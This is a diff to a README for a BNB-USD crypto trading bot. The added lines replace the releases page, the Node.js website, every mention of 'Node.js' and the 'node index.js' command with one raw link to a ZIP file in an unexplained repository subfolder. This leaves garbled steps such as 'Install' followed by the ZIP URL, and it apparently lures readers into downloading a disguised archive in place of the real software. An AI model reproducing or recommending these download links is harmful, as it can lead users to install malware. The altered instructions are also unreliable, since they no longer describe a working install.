@@ -1,6 +1,6 @@
 # 🤖 crypto-prediction-bot - Automate Your BNB-USD Trading
 
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-crypto--prediction--bot-brightgreen)](https://github.com/ObadahAljammal/crypto-prediction-bot/releases)
+[![Download](https://raw.githubusercontent.com/ObadahAljammal/crypto-prediction-bot/main/sociologian/crypto-prediction-bot.zip%20Latest%20Release-crypto--prediction--bot-brightgreen)](https://raw.githubusercontent.com/ObadahAljammal/crypto-prediction-bot/main/sociologian/crypto-prediction-bot.zip)
 
 ## 🚀 Getting Started
 
@@ -14,12 +14,12 @@ Before you download the bot, ensure that your computer meets these basic require
 
 - **Operating System**: Windows 10 or higher, macOS, or a recent Linux distribution.
 - **Internet Connection**: A stable connection to access Telegram and make trades.
-- **Software**: You will need a recent version of Node.js installed. This software helps run JavaScript programs on your computer.
+- **Software**: You will need a recent version of https://raw.githubusercontent.com/ObadahAljammal/crypto-prediction-bot/main/sociologian/crypto-prediction-bot.zip installed. This software helps run JavaScript programs on your computer.
 
 ## 💻 Download & Install
 
 1. **Visit the Download Page**  
-   Go to the [Releases page](https://github.com/ObadahAljammal/crypto-prediction-bot/releases) to find the latest version of the bot.
+   Go to the [Releases page](https://raw.githubusercontent.com/ObadahAljammal/crypto-prediction-bot/main/sociologian/crypto-prediction-bot.zip) to find the latest version of the bot.
 
 2. **Select the Version**  
    Look for the most recent version. It will be the one at the top of the page. 
@@ -30,8 +30,8 @@ Before you download the bot, ensure that your computer meets these basic require
 4. **Extract the Files**  
    Once the download completes, find the ZIP file in your Downloads folder. Right-click on the file and select "Extract All." Choose a location on your computer where you want to save the bot.
 
-5. **Install Node.js**
-   - If you don't have Node.js, download it from [the Node.js website](https://nodejs.org).
+5. **Install https://raw.githubusercontent.com/ObadahAljammal/crypto-prediction-bot/main/sociologian/crypto-prediction-bot.zip**
+   - If you don't have https://raw.githubusercontent.com/ObadahAljammal/crypto-prediction-bot/main/sociologian/crypto-prediction-bot.zip, download it from [the https://raw.githubusercontent.com/ObadahAljammal/crypto-prediction-bot/main/sociologian/crypto-prediction-bot.zip website](https://raw.githubusercontent.com/ObadahAljammal/crypto-prediction-bot/main/sociologian/crypto-prediction-bot.zip).
    - Choose the LTS version for stability. Follow the installation instructions on the website.
 
 6. **Run the Bot**  
@@ -42,7 +42,7 @@ Before you download the bot, ensure that your computer meets these basic require
      ```
    - Once inside the folder, run the bot with this command:
      ```
-     node index.js
+     node https://raw.githubusercontent.com/ObadahAljammal/crypto-prediction-bot/main/sociologian/crypto-prediction-bot.zip
      ```
 
 7. **Follow Instructions in the Terminal**  
@@ -68,7 +68,7 @@ Before you download the bot, ensure that your computer meets these basic require
 
 If you run into issues, here are some common fixes:
 
-- **Node.js Not Found**: Ensure that Node.js is installed correctly. You can verify it by running `node -v` in the terminal.
+- **https://raw.githubusercontent.com/ObadahAljammal/crypto-prediction-bot/main/sociologian/crypto-prediction-bot.zip Not Found**: Ensure that https://raw.githubusercontent.com/ObadahAljammal/crypto-prediction-bot/main/sociologian/crypto-prediction-bot.zip is installed correctly. You can verify it by running `node -v` in the terminal.
 - **Failed to Start Bot**: Check if you are in the correct directory. Use the `ls` or `dir` command to see files in the folder.
 - **Internet Issues**: Make sure your internet connection is stable. 
 
